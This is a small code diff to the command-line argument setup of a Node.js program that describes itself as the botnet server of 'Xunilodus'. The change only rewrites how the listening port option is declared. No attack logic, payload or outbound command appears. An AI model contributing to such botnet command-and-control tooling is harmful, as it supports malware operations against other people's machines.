@@ -17,12 +17,12 @@ var argv = yargs.scriptName("Xunilodus-Server")
   .example(
     "$0 --port=44335",
     "Run the botnet server of Xunilodus on port 44335."
-  ).command('port', 'The port to listen for incoming connections.', {
-    'port': {
+  ).command('port [port]', 'The port to listen for incoming connections.', (yargs) => {
+    return yargs.positional('port', {
       description: 'The port to listen for incoming connections.',
       demandOption: "The port of server is required.",
       type: 'number',
-    }
+    })
   }).help().alias('help', 'h').argv;
 
 if (!argv['port']){
